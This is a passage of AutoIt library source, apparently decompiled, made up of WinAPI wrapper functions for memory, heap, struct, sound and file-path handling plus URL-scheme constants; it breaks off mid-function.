    If _WinAPI_IsBadReadPtr($psource2, $ilength) Then Return SetError(0xc, @extended, 0x0)
    Local $acall = DllCall("ntdll.dll", "ulong_ptr", "RtlCompareMemory", "struct*", $psource1, "struct*", $psource2, "ulong_ptr", $ilength)
    If @error Then Return SetError(@error, @extended, 0x0)
    Return Number($acall[0x0] = $ilength)
EndFunc   ;==>_WINAPI_EQUALMEMORY
Func _WinAPI_FillMemory($pmemory, $ilength, $ivalue = 0x0)
    If _WinAPI_IsBadWritePtr($pmemory, $ilength) Then Return SetError(0xb, @extended, 0x0)
    DllCall("ntdll.dll", "none", "RtlFillMemory", "struct*", $pmemory, "ulong_ptr", $ilength, "byte", $ivalue)
    If @error Then Return SetError(@error, @extended, 0x0)
    Return 0x1
EndFunc   ;==>_WINAPI_FILLMEMORY
Func _WinAPI_FreeMemory($pmemory)
    If Not __HEAPFREE($pmemory, 0x1) Then Return SetError(@error, @extended, 0x0)
    Return 0x1
EndFunc   ;==>_WINAPI_FREEMEMORY
Func _WinAPI_GetMemorySize($pmemory)
    Local $iresult = __HEAPSIZE($pmemory, 0x1)
    If @error Then Return SetError(@error, @extended, 0x0)
    Return $iresult
EndFunc   ;==>_WINAPI_GETMEMORYSIZE
Func _WinAPI_GlobalMemoryStatus()
    Local Const $tagmemorystatusex = "dword Length;dword MemoryLoad;" & "uint64 TotalPhys;uint64 AvailPhys;uint64 TotalPageFile;uint64 AvailPageFile;" & "uint64 TotalVirtual;uint64 AvailVirtual;uint64 AvailExtendedVirtual"
    Local $tmem = DllStructCreate($tagmemorystatusex)
    DllStructSetData($tmem, 0x1, DllStructGetSize($tmem))
    Local $acall = DllCall("kernel32.dll", "bool", "GlobalMemoryStatusEx", "struct*", $tmem)
    If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
    Local $amem[0x7]
    $amem[0x0] = DllStructGetData($tmem, 0x2)
    $amem[0x1] = DllStructGetData($tmem, 0x3)
    $amem[0x2] = DllStructGetData($tmem, 0x4)
    $amem[0x3] = DllStructGetData($tmem, 0x5)
    $amem[0x4] = DllStructGetData($tmem, 0x6)
    $amem[0x5] = DllStructGetData($tmem, 0x7)
    $amem[0x6] = DllStructGetData($tmem, 0x8)
    Return $amem
EndFunc   ;==>_WINAPI_GLOBALMEMORYSTATUS
Func _WinAPI_IsBadCodePtr($paddress)
    Local $acall = DllCall("kernel32.dll", "bool", "IsBadCodePtr", "struct*", $paddress)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_ISBADCODEPTR
Func _WinAPI_IsBadReadPtr($paddress, $ilength)
    Local $acall = DllCall("kernel32.dll", "bool", "IsBadReadPtr", "struct*", $paddress, "uint_ptr", $ilength)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_ISBADREADPTR
Func _WinAPI_IsBadStringPtr($paddress, $ilength)
    Local $acall = DllCall("kernel32.dll", "bool", "IsBadStringPtr", "struct*", $paddress, "uint_ptr", $ilength)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_ISBADSTRINGPTR
Func _WinAPI_IsBadWritePtr($paddress, $ilength)
    Local $acall = DllCall("kernel32.dll", "bool", "IsBadWritePtr", "struct*", $paddress, "uint_ptr", $ilength)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_ISBADWRITEPTR
Func _WinAPI_IsMemory($pmemory)
    Local $bresult = __HEAPVALIDATE($pmemory)
    Return SetError(@error, @extended, $bresult)
EndFunc   ;==>_WINAPI_ISMEMORY
Func _WinAPI_LocalFree($hmemory)
    Local $acall = DllCall("kernel32.dll", "handle", "LocalFree", "handle", $hmemory)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_LOCALFREE
Func _WinAPI_MoveMemory($pdestination, $psource, $ilength)
    If _WinAPI_IsBadReadPtr($psource, $ilength) Then Return SetError(0xa, @extended, 0x0)
    If _WinAPI_IsBadWritePtr($pdestination, $ilength) Then Return SetError(0xb, @extended, 0x0)
    DllCall("ntdll.dll", "none", "RtlMoveMemory", "struct*", $pdestination, "struct*", $psource, "ulong_ptr", $ilength)
    If @error Then Return SetError(@error, @extended, 0x0)
    Return 0x1
EndFunc   ;==>_WINAPI_MOVEMEMORY
Func _WinAPI_ReadProcessMemory($hprocess, $pbaseaddress, $pbuffer, $isize, ByRef $iread)
    Local $acall = DllCall("kernel32.dll", "bool", "ReadProcessMemory", "handle", $hprocess, "ptr", $pbaseaddress, "struct*", $pbuffer, "ulong_ptr", $isize, "ulong_ptr*", 0x0)
    If @error Then Return SetError(@error, @extended, False)
    $iread = $acall[0x5]
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_READPROCESSMEMORY
Func _WinAPI_WriteProcessMemory($hprocess, $pbaseaddress, $pbuffer, $isize, ByRef $iwritten, $sbuffertype = "ptr")
    Local $acall = DllCall("kernel32.dll", "bool", "WriteProcessMemory", "handle", $hprocess, "ptr", $pbaseaddress, $sbuffertype, $pbuffer, "ulong_ptr", $isize, "ulong_ptr*", 0x0)
    If @error Then Return SetError(@error, @extended, False)
    $iwritten = $acall[0x5]
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_WRITEPROCESSMEMORY
Func _WinAPI_ZeroMemory($pmemory, $ilength)
    If _WinAPI_IsBadWritePtr($pmemory, $ilength) Then Return SetError(0xb, @extended, 0x0)
    DllCall("ntdll.dll", "none", "RtlZeroMemory", "struct*", $pmemory, "ulong_ptr", $ilength)
    If @error Then Return SetError(@error, @extended, 0x0)
    Return 0x1
EndFunc   ;==>_WINAPI_ZEROMEMORY
#EndRegion Public Functions
#Region Internal Functions
Func __HEAPALLOC($isize, $babort = False)
    Local $acall
    If Not $__g_hheap Then
        $acall = DllCall("kernel32.dll", "handle", "HeapCreate", "dword", 0x0, "ulong_ptr", 0x0, "ulong_ptr", 0x0)
        If @error Or Not $acall[0x0] Then __FATALEXIT(0x1, "Error allocating memory.")
        $__g_hheap = $acall[0x0]
    EndIf
    $acall = DllCall("kernel32.dll", "ptr", "HeapAlloc", "handle", $__g_hheap, "dword", 0x8, "ulong_ptr", $isize)
    If @error Or Not $acall[0x0] Then
        If $babort Then __FATALEXIT(0x1, "Error allocating memory.")
        Return SetError(@error + 0x1e, @extended, 0x0)
    EndIf
    Return $acall[0x0]
EndFunc   ;==>__HEAPALLOC
Func __HEAPFREE(ByRef $pmemory, $bcheck = False, $icurerr = @error, $icurext = @extended)
    If $bcheck And (Not __HEAPVALIDATE($pmemory)) Then Return SetError(@error, @extended, 0x0)
    Local $acall = DllCall("kernel32.dll", "int", "HeapFree", "handle", $__g_hheap, "dword", 0x0, "ptr", $pmemory)
    If @error Or Not $acall[0x0] Then Return SetError(@error + 0x28, @extended, 0x0)
    $pmemory = 0x0
    Return SetError($icurerr, $icurext, 0x1)
EndFunc   ;==>__HEAPFREE
Func __HEAPREALLOC($pmemory, $isize, $bamount = False, $babort = False)
    Local $pret
    If __HEAPVALIDATE($pmemory) Then
        If $bamount And (__HEAPSIZE($pmemory) >= $isize) Then Return SetExtended(0x1, Ptr($pmemory))
        Local $acall = DllCall("kernel32.dll", "ptr", "HeapReAlloc", "handle", $__g_hheap, "dword", 0x8, "ptr", $pmemory, "ulong_ptr", $isize)
        If @error Or Not $acall[0x0] Then
            If $babort Then __FATALEXIT(0x1, "Error allocating memory.")
            Return SetError(@error + 0x14, @extended, Ptr($pmemory))
        EndIf
        $pret = $acall[0x0]
    Else
        $pret = __HEAPALLOC($isize, $babort)
        If @error Then Return SetError(@error, @extended, 0x0)
    EndIf
    Return $pret
EndFunc   ;==>__HEAPREALLOC
Func __HEAPSIZE($pmemory, $bcheck = False)
    If $bcheck And (Not __HEAPVALIDATE($pmemory)) Then Return SetError(@error, @extended, 0x0)
    Local $acall = DllCall("kernel32.dll", "ulong_ptr", "HeapSize", "handle", $__g_hheap, "dword", 0x0, "ptr", $pmemory)
    If @error Or ($acall[0x0] = Ptr(+0xffffffff)) Then Return SetError(@error + 0x32, @extended, 0x0)
    Return $acall[0x0]
EndFunc   ;==>__HEAPSIZE
Func __HEAPVALIDATE($pmemory)
    If (Not $__g_hheap) Or (Not Ptr($pmemory)) Then Return SetError(0x9, 0x0, False)
    Local $acall = DllCall("kernel32.dll", "int", "HeapValidate", "handle", $__g_hheap, "dword", 0x0, "ptr", $pmemory)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>__HEAPVALIDATE
#EndRegion Internal Functions
Global Const $snd_application = 0x80
Global Const $snd_alias = 0x10000
Global Const $snd_alias_id = 0x110000
Global Const $snd_async = 0x1
Global Const $snd_filename = 0x20000
Global Const $snd_loop = 0x8
Global Const $snd_memory = 0x4
Global Const $snd_nodefault = 0x2
Global Const $snd_nostop = 0x10
Global Const $snd_nowait = 0x2000
Global Const $snd_purge = 0x40
Global Const $snd_resource = 0x40004
Global Const $snd_sentry = 0x80000
Global Const $snd_sync = 0x0
Global Const $snd_system = 0x200000
Global Const $snd_system_nostop = 0x200010
Global Const $snd_alias_systemasterisk = "SystemAsterisk"
Global Const $snd_alias_systemdefault = "SystemDefault"
Global Const $snd_alias_systemexclamation = "SystemExclamation"
Global Const $snd_alias_systemexit = "SystemExit"
Global Const $snd_alias_systemhand = "SystemHand"
Global Const $snd_alias_systemquestion = "SystemQuestion"
Global Const $snd_alias_systemstart = "SystemStart"
Global Const $snd_alias_systemwelcome = "SystemWelcome"
#Region Global Variables and Constants
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
#Region Public Functions
Func _WinAPI_ArrayToStruct(Const ByRef $adata, $istart = 0x0, $iend = +0xffffffff)
    If __CHECKERRORARRAYBOUNDS($adata, $istart, $iend) Then Return SetError(@error + 0xa, @extended, 0x0)
    Local $tagstruct = ""
    For $i = $istart To $iend
        $tagstruct &= "wchar[" & (StringLen($adata[$i]) + 0x1) & "];"
    Next
    Local $tdata = DllStructCreate($tagstruct & "wchar[1]")
    Local $icount = 0x1
    For $i = $istart To $iend
        DllStructSetData($tdata, $icount, $adata[$i])
        $icount += 0x1
    Next
    DllStructSetData($tdata, $icount, ChrW(0x0))
    Return $tdata
EndFunc   ;==>_WINAPI_ARRAYTOSTRUCT
Func _WinAPI_CreateMargins($ileftwidth, $irightwidth, $itopheight, $ibottomheight)
    Local $tmargins = DllStructCreate($tagmargins)
    DllStructSetData($tmargins, 0x1, $ileftwidth)
    DllStructSetData($tmargins, 0x2, $irightwidth)
    DllStructSetData($tmargins, 0x3, $itopheight)
    DllStructSetData($tmargins, 0x4, $ibottomheight)
    Return $tmargins
EndFunc   ;==>_WINAPI_CREATEMARGINS
Func _WinAPI_CreatePoint($ix, $iy)
    Local $tpoint = DllStructCreate($tagpoint)
    DllStructSetData($tpoint, 0x1, $ix)
    DllStructSetData($tpoint, 0x2, $iy)
    Return $tpoint
EndFunc   ;==>_WINAPI_CREATEPOINT
Func _WinAPI_CreateRect($ileft, $itop, $iright, $ibottom)
    Local $trect = DllStructCreate($tagrect)
    DllStructSetData($trect, 0x1, $ileft)
    DllStructSetData($trect, 0x2, $itop)
    DllStructSetData($trect, 0x3, $iright)
    DllStructSetData($trect, 0x4, $ibottom)
    Return $trect
EndFunc   ;==>_WINAPI_CREATERECT
Func _WinAPI_CreateRectEx($ix, $iy, $iwidth, $iheight)
    Local $trect = DllStructCreate($tagrect)
    DllStructSetData($trect, 0x1, $ix)
    DllStructSetData($trect, 0x2, $iy)
    DllStructSetData($trect, 0x3, $ix + $iwidth)
    DllStructSetData($trect, 0x4, $iy + $iheight)
    Return $trect
EndFunc   ;==>_WINAPI_CREATERECTEX
Func _WinAPI_CreateSize($iwidth, $iheight)
    Local $tsize = DllStructCreate($tagsize)
    DllStructSetData($tsize, 0x1, $iwidth)
    DllStructSetData($tsize, 0x2, $iheight)
    Return $tsize
EndFunc   ;==>_WINAPI_CREATESIZE
Func _WinAPI_CopyStruct($tstruct, $sstruct = "")
    Local $isize = DllStructGetSize($tstruct)
    If Not $isize Then Return SetError(0x1, 0x0, 0x0)
    Local $tresult
    If Not StringStripWS($sstruct, $str_stripleading + $str_striptrailing + $str_stripspaces) Then
        $tresult = DllStructCreate("byte[" & $isize & "]")
    Else
        $tresult = DllStructCreate($sstruct)
    EndIf
    If DllStructGetSize($tresult) < $isize Then Return SetError(0x2, 0x0, 0x0)
    _WinAPI_MoveMemory($tresult, $tstruct, $isize)
    Return $tresult
EndFunc   ;==>_WINAPI_COPYSTRUCT
Func _WinAPI_GetExtended()
    Return $__g_vext
EndFunc   ;==>_WINAPI_GETEXTENDED
Func _WinAPI_GetMousePos($btoclient = False, $hwnd = 0x0)
    Local $imode = Opt("MouseCoordMode", 0x1)
    Local $apos = MouseGetPos()
    Opt("MouseCoordMode", $imode)
    Local $tpoint = DllStructCreate($tagpoint)
    DllStructSetData($tpoint, "X", $apos[0x0])
    DllStructSetData($tpoint, "Y", $apos[0x1])
    If $btoclient And Not _WinAPI_ScreenToClient($hwnd, $tpoint) Then Return SetError(@error + 0x14, @extended, 0x0)
    Return $tpoint
EndFunc   ;==>_WINAPI_GETMOUSEPOS
Func _WinAPI_GetMousePosX($btoclient = False, $hwnd = 0x0)
    Local $tpoint = _WinAPI_GetMousePos($btoclient, $hwnd)
    If @error Then Return SetError(@error, @extended, 0x0)
    Return DllStructGetData($tpoint, "X")
EndFunc   ;==>_WINAPI_GETMOUSEPOSX
Func _WinAPI_GetMousePosY($btoclient = False, $hwnd = 0x0)
    Local $tpoint = _WinAPI_GetMousePos($btoclient, $hwnd)
    If @error Then Return SetError(@error, @extended, 0x0)
    Return DllStructGetData($tpoint, "Y")
EndFunc   ;==>_WINAPI_GETMOUSEPOSY
Func _WinAPI_MulDiv($inumber, $inumerator, $idenominator)
    Local $acall = DllCall("kernel32.dll", "int", "MulDiv", "int", $inumber, "int", $inumerator, "int", $idenominator)
    If @error Then Return SetError(@error, @extended, +0xffffffff)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_MULDIV
Func _WinAPI_PlaySound($ssound, $iflags = $snd_system_nostop, $hinstance = 0x0)
    Local $stypeofsound = "ptr"
    If $ssound Then
        If IsString($ssound) Then
            $stypeofsound = "wstr"
        EndIf
    Else
        $ssound = 0x0
        $iflags = 0x0
    EndIf
    Local $acall = DllCall("winmm.dll", "bool", "PlaySoundW", $stypeofsound, $ssound, "handle", $hinstance, "dword", $iflags)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_PLAYSOUND
Func _WinAPI_StringLenA(Const ByRef $tstring)
    Local $acall = DllCall("kernel32.dll", "int", "lstrlenA", "struct*", $tstring)
    If @error Then Return SetError(@error, @extended, 0x0)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_STRINGLENA
Func _WinAPI_StringLenW(Const ByRef $tstring)
    Local $acall = DllCall("kernel32.dll", "int", "lstrlenW", "struct*", $tstring)
    If @error Then Return SetError(@error, @extended, 0x0)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_STRINGLENW
Func _WinAPI_StructToArray(ByRef $tstruct, $iitems = 0x0)
    Local $isize = 0x2 * Floor(DllStructGetSize($tstruct) / 0x2)
    Local $pstruct = DllStructGetPtr($tstruct)
    If Not $isize Or Not $pstruct Then Return SetError(0x1, 0x0, 0x0)
    Local $tdata, $ilength, $ioffset = 0x0
    Local $aret[0x65] = [0x0]
    While 0x1
        $ilength = _WinAPI_StrLen($pstruct + $ioffset)
        If Not $ilength Then
            ExitLoop
        EndIf
        If 0x2 * (0x1 + $ilength) + $ioffset > $isize Then Return SetError(0x3, 0x0, 0x0)
        $tdata = DllStructCreate("wchar[" & (0x1 + $ilength) & "]", $pstruct + $ioffset)
        If @error Then Return SetError(@error + 0xa, 0x0, 0x0)
        __INC($aret)
        $aret[$aret[0x0]] = DllStructGetData($tdata, 0x1)
        If $aret[0x0] = $iitems Then
            ExitLoop
        EndIf
        $ioffset += 0x2 * (0x1 + $ilength)
        If $ioffset >= $isize Then Return SetError(0x3, 0x0, 0x0)
    WEnd
    If Not $aret[0x0] Then Return SetError(0x2, 0x0, 0x0)
    __INC($aret, +0xffffffff)
    Return $aret
EndFunc   ;==>_WINAPI_STRUCTTOARRAY
Func _WinAPI_UnionStruct($tstruct1, $tstruct2, $sstruct = "")
    Local $asize[0x2] = [DllStructGetSize($tstruct1), DllStructGetSize($tstruct2)]
    If Not $asize[0x0] Or Not $asize[0x1] Then Return SetError(0x1, 0x0, 0x0)
    Local $tresult
    If Not StringStripWS($sstruct, $str_stripleading + $str_striptrailing + $str_stripspaces) Then
        $tresult = DllStructCreate("byte[" & ($asize[0x0] + $asize[0x1]) & "]")
    Else
        $tresult = DllStructCreate($sstruct)
    EndIf
    If DllStructGetSize($tresult) < ($asize[0x0] + $asize[0x1]) Then Return SetError(0x2, 0x0, 0x0)
    _WinAPI_MoveMemory($tresult, $tstruct1, $asize[0x0])
    _WinAPI_MoveMemory(DllStructGetPtr($tresult) + $asize[0x0], $tstruct2, $asize[0x1])
    Return $tresult
EndFunc   ;==>_WINAPI_UNIONSTRUCT
#EndRegion Public Functions
Global Const $url_scheme_invalid = +0xffffffff
Global Const $url_scheme_unknown = 0x0
Global Const $url_scheme_ftp = 0x1
Global Const $url_scheme_http = 0x2
Global Const $url_scheme_gopher = 0x3
Global Const $url_scheme_mailto = 0x4
Global Const $url_scheme_news = 0x5
Global Const $url_scheme_nntp = 0x6
Global Const $url_scheme_telnet = 0x7
Global Const $url_scheme_wais = 0x8
Global Const $url_scheme_file = 0x9
Global Const $url_scheme_mk = 0xa
Global Const $url_scheme_https = 0xb
Global Const $url_scheme_shell = 0xc
Global Const $url_scheme_snews = 0xd
Global Const $url_scheme_local = 0xe
Global Const $url_scheme_javascript = 0xf
Global Const $url_scheme_vbscript = 0x10
Global Const $url_scheme_about = 0x11
Global Const $url_scheme_res = 0x12
Global Const $url_scheme_msshellrooted = 0x13
Global Const $url_scheme_msshellidlist = 0x14
Global Const $url_scheme_mshelp = 0x15
Global Const $url_scheme_msshelldevice = 0x16
Global Const $url_scheme_wildcard = 0x17
Global Const $url_scheme_search_ms = 0x18
Global Const $url_scheme_search = 0x19
Global Const $url_scheme_knownfolder = 0x1a
Global Const $gct_invalid = 0x0
Global Const $gct_lfnchar = 0x1
Global Const $gct_separator = 0x8
Global Const $gct_shortchar = 0x2
Global Const $gct_wild = 0x4
Global Const $url_apply_default = 0x1
Global Const $url_apply_guessscheme = 0x2
Global Const $url_apply_guessfile = 0x4
Global Const $url_apply_forceapply = 0x8
Global Const $url_dont_simplify = 0x8000000
Global Const $url_escape_as_utf8 = 0x40000
Global Const $url_escape_percent = 0x1000
Global Const $url_escape_spaces_only = 0x4000000
Global Const $url_escape_unsafe = 0x20000000
Global Const $url_no_meta = 0x8000000
Global Const $url_pluggable_protocol = 0x40000000
Global Const $url_unescape = 0x10000000
Global Const $url_part_hostname = 0x2
Global Const $url_part_password = 0x4
Global Const $url_part_port = 0x5
Global Const $url_part_query = 0x6
Global Const $url_part_scheme = 0x1
Global Const $url_part_username = 0x3
Global Const $urlis_appliable = 0x4
Global Const $urlis_directory = 0x5
Global Const $urlis_fileurl = 0x3
Global Const $urlis_hasquery = 0x6
Global Const $urlis_nohistory = 0x2
Global Const $urlis_opaque = 0x1
Global Const $urlis_url = 0x0
#Region Functions list
#EndRegion Functions list
#Region Public Functions
Func _WinAPI_CommandLineToArgv($scmd)
    Local $aret[0x1] = [0x0]
    $scmd = StringStripWS($scmd, $str_stripleading + $str_striptrailing)
    If Not $scmd Then
        Return $aret
    EndIf
    Local $acall = DllCall("shell32.dll", "ptr", "CommandLineToArgvW", "wstr", $scmd, "int*", 0x0)
    If @error Or Not $acall[0x0] Or (Not $acall[0x2]) Then Return SetError(@error + 0xa, @extended, 0x0)
    Local $tptr = DllStructCreate("ptr[" & $acall[0x2] & "]", $acall[0x0])
    Dim $aret[$acall[0x2] + 0x1] = [$acall[0x2]]
    For $i = 0x1 To $acall[0x2]
        $aret[$i] = _WinAPI_GetString(DllStructGetData($tptr, 0x1, $i))
    Next
    DllCall("kernel32.dll", "handle", "LocalFree", "handle", $acall[0x0])
    Return $aret
EndFunc   ;==>_WINAPI_COMMANDLINETOARGV
Func _WinAPI_IsNameInExpression($sstring, $spattern, $bcasesensitive = False)
    If Not $bcasesensitive Then $spattern = StringUpper($spattern)
    Local $tus1 = __US($spattern)
    Local $tus2 = __US($sstring)
    Local $acall = DllCall("ntdll.dll", "boolean", "RtlIsNameInExpression", "struct*", $tus1, "struct*", $tus2, "boolean", Not $bcasesensitive, "ptr", 0x0)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_ISNAMEINEXPRESSION
Func _WinAPI_ParseURL($surl)
    Local $tagparsedurl = "dword Size;ptr Protocol;uint cchProtocol;ptr Suffix;uint cchSuffix;uint Scheme"
    Local $tpurl = DllStructCreate($tagparsedurl)
    DllStructSetData($tpurl, 0x1, DllStructGetSize($tpurl))
    Local $turl = DllStructCreate("wchar[4096]")
    DllStructSetData($turl, 0x1, $surl)
    Local $acall = DllCall("shlwapi.dll", "long", "ParseURLW", "struct*", $turl, "struct*", $tpurl)
    If @error Then Return SetError(@error, @extended, "")
    If $acall[0x0] Then Return SetError(0xa, $acall[0x0], "")
    Local $aret[0x3]
    $aret[0x0] = DllStructGetData(DllStructCreate("wchar[" & DllStructGetData($tpurl, 0x3) & "]", DllStructGetData($tpurl, 0x2)), 0x1)
    $aret[0x1] = DllStructGetData(DllStructCreate("wchar[" & DllStructGetData($tpurl, 0x5) & "]", DllStructGetData($tpurl, 0x4)), 0x1)
    $aret[0x2] = DllStructGetData($tpurl, 0x6)
    Return $aret
EndFunc   ;==>_WINAPI_PARSEURL
Func _WinAPI_ParseUserName($suser)
    If Not __DLL("credui.dll") Then Return SetError(0x67, 0x0, 0x0)
    Local $acall = DllCall("credui.dll", "dword", "CredUIParseUserNameW", "wstr", $suser, "wstr", "", "ulong", 0x1000, "wstr", "", "ulong", 0x1000)
    If @error Then Return SetError(@error, @extended, 0x0)
    Switch $acall[0x0]
        Case 0x0
        Case 0x523
            If StringStripWS($suser, $str_stripleading + $str_striptrailing) Then
                $acall[0x2] = $suser
                $acall[0x4] = ""
            Else
                ContinueCase
            EndIf
        Case Else
            Return SetError(0xa, $acall[0x0], 0x0)
    EndSwitch
    Local $aret[0x2]
    $aret[0x0] = $acall[0x4]
    $aret[0x1] = $acall[0x2]
    Return $aret
EndFunc   ;==>_WINAPI_PARSEUSERNAME
Func _WinAPI_PathAddBackslash($sfilepath)
    Local $tpath = DllStructCreate("wchar[260]")
    DllStructSetData($tpath, 0x1, $sfilepath)
    Local $acall = DllCall("shlwapi.dll", "ptr", "PathAddBackslashW", "struct*", $tpath)
    If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, "")
    Return DllStructGetData($tpath, 0x1)
EndFunc   ;==>_WINAPI_PATHADDBACKSLASH
Func _WinAPI_PathAddExtension($sfilepath, $sext = "")
    Local $tpath = DllStructCreate("wchar[260]")
    DllStructSetData($tpath, 0x1, $sfilepath)
    If Not StringStripWS($sext, $str_stripleading + $str_striptrailing) Then $sext = Null
    Local $acall = DllCall("shlwapi.dll", "bool", "PathAddExtensionW", "struct*", $tpath, "wstr", $sext)
    If @error Then Return SetError(@error, @extended, "")
    Return SetExtended($acall[0x0], DllStructGetData($tpath, 0x1))
EndFunc   ;==>_WINAPI_PATHADDEXTENSION
Func _WinAPI_PathAppend($sfilepath, $smore)
    Local $tpath = DllStructCreate("wchar[260]")
    DllStructSetData($tpath, 0x1, $sfilepath)
    Local $acall = DllCall("shlwapi.dll", "bool", "PathAppendW", "struct*", $tpath, "wstr", $smore)
    If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, "")
    Return DllStructGetData($tpath, 0x1)
EndFunc   ;==>_WINAPI_PATHAPPEND
Func _WinAPI_PathBuildRoot($idrive)
    Local $acall = DllCall("shlwapi.dll", "ptr", "PathBuildRootW", "wstr", "", "int", $idrive)
    If @error Then Return SetError(@error, @extended, "")
    Return $acall[0x1]
EndFunc   ;==>_WINAPI_PATHBUILDROOT
Func _WinAPI_PathCanonicalize($sfilepath)
    Local $acall = DllCall("shlwapi.dll", "bool", "PathCanonicalizeW", "wstr", "", "wstr", $sfilepath)
    If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, $sfilepath)
    Return $acall[0x1]
EndFunc   ;==>_WINAPI_PATHCANONICALIZE
Func _WinAPI_PathCommonPrefix($spath1, $spath2)
    Local $acall = DllCall("shlwapi.dll", "int", "PathCommonPrefixW", "wstr", $spath1, "wstr", $spath2, "wstr", "")
    If @error Then Return SetError(@error, @extended, "")
    Return SetExtended($acall[0x0], $acall[0x3])
EndFunc   ;==>_WINAPI_PATHCOMMONPREFIX
Func _WinAPI_PathCompactPath($hwnd, $sfilepath, $iwidth = 0x0)
    If $iwidth < 0x1 Then
        Local $trect = DllStructCreate($tagrect)
        DllCall("user32.dll", "bool", "GetClientRect", "hwnd", $hwnd, "struct*", $trect)
        $iwidth += DllStructGetData($trect, "Right") - DllStructGetData($trect, "Left")
    EndIf
    Local $acall = DllCall("user32.dll", "handle", "GetDC", "hwnd", $hwnd)
    If @error Or Not $acall[0x0] Then Return SetError(@error + 0x14, @extended, $sfilepath)
    Local $hdc = $acall[0x0]
    Local Const $wm_getfont = 0x31
    $acall = DllCall("user32.dll", "ptr", "SendMessage", "hwnd", $hwnd, "uint", $wm_getfont, "wparam", 0x0, "lparam", 0x0)
    Local $hback = DllCall("gdi32.dll", "handle", "SelectObject", "handle", $hdc, "handle", $acall[0x0])
    Local $ierror = 0x0
    $acall = DllCall("shlwapi.dll", "bool", "PathCompactPathW", "handle", $hdc, "wstr", $sfilepath, "int", $iwidth)
    If @error Or Not $acall[0x0] Then $ierror = @error + 0xa
    DllCall("gdi32.dll", "handle", "SelectObject", "handle", $hdc, "handle", $hback[0x0])
    DllCall("user32.dll", "int", "ReleaseDC", "hwnd", $hwnd, "handle", $hdc)
    If $ierror Then Return SetError($ierror, 0x0, $sfilepath)
    Return $acall[0x2]
EndFunc   ;==>_WINAPI_PATHCOMPACTPATH
Func _WinAPI_PathCompactPathEx($sfilepath, $imax)
    Local $acall = DllCall("shlwapi.dll", "bool", "PathCompactPathExW", "wstr", "", "wstr", $sfilepath, "uint", $imax + 0x1, "dword", 0x0)
    If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, $sfilepath)
    Return $acall[0x1]
EndFunc   ;==>_WINAPI_PATHCOMPACTPATHEX
Func _WinAPI_PathCreateFromUrl($surl)
    Local $acall = DllCall("shlwapi.dll", "long", "PathCreateFromUrlW", "wstr", $surl, "wstr", "", "dword*", 0x1000, "dword", 0x0)
    If @error Then Return SetError(@error, @extended, "")
    If $acall[0x0] Then Return SetError(0xa, $acall[0x0], "")
    Return $acall[0x2]
EndFunc   ;==>_WINAPI_PATHCREATEFROMURL
Func _WinAPI_PathFindExtension($sfilepath)
    Local $acall = DllCall("shlwapi.dll", "wstr", "PathFindExtensionW", "wstr", $sfilepath)
    If @error Then Return SetError(@error, @extended, "")
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_PATHFINDEXTENSION
Func _WinAPI_PathFindFileName($sfilepath)
    Local $acall = DllCall("shlwapi.dll", "wstr", "PathFindFileNameW", "wstr", $sfilepath)
    If @error Then Return SetError(@error, @extended, $sfilepath)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_PATHFINDFILENAME
Func _WinAPI_PathFindNextComponent($sfilepath)
    Local $tpath = DllStructCreate("wchar[" & (StringLen($sfilepath) + 0x1) & "]")
    DllStructSetData($tpath, 0x1, $sfilepath)
    Local $acall = DllCall("shlwapi.dll", "ptr", "PathFindNextComponentW", "struct*", $tpath)
    If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, "")
    Return _WinAPI_GetString($acall[0x0])
EndFunc   ;==>_WINAPI_PATHFINDNEXTCOMPONENT
Func _WinAPI_PathFindOnPath(Const $sfilepath, $aextrapaths = "", Const $spathdelimiter = @LF)
    Local $iextracount = 0x0
    If IsString($aextrapaths) Then
        If StringLen($aextrapaths) Then
            $aextrapaths = StringSplit($aextrapaths, $spathdelimiter, $str_entiresplit + $str_nocount)
            $iextracount = UBound($aextrapaths, $ubound_rows)
        EndIf
    ElseIf IsArray($aextrapaths) Then
        $iextracount = UBound($aextrapaths)
    EndIf
    Local $tpaths, $tpathptrs
    If $iextracount Then
        Local $tagstruct = ""
        For $path In $aextrapaths
            $tagstruct &= "wchar[" & StringLen($path) + 0x1 & "];"
        Next
        $tpaths = DllStructCreate($tagstruct)
        $tpathptrs = DllStructCreate("ptr[" & $iextracount + 0x1 & "]")
        For $i = 0x1 To $iextracount
            DllStructSetData($tpaths, $i, $aextrapaths[$i + 0xffffffff])
            DllStructSetData($tpathptrs, 0x1, DllStructGetPtr($tpaths, $i), $i)
        Next
        DllStructSetData($tpathptrs, 0x1, Ptr(0x0), $iextracount + 0x1)
    EndIf
    Local $acall = DllCall("shlwapi.dll", "bool", "PathFindOnPathW", "wstr", $sfilepath, "struct*", $tpathptrs)
    If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, $sfilepath)
    Return $acall[0x1]
EndFunc   ;==>_WINAPI_PATHFINDONPATH
Func _WinAPI_PathGetArgs($sfilepath)
    Local $tpath = DllStructCreate("wchar[" & (StringLen($sfilepath) + 0x1) & "]")
    DllStructSetData($tpath, 0x1, $sfilepath)
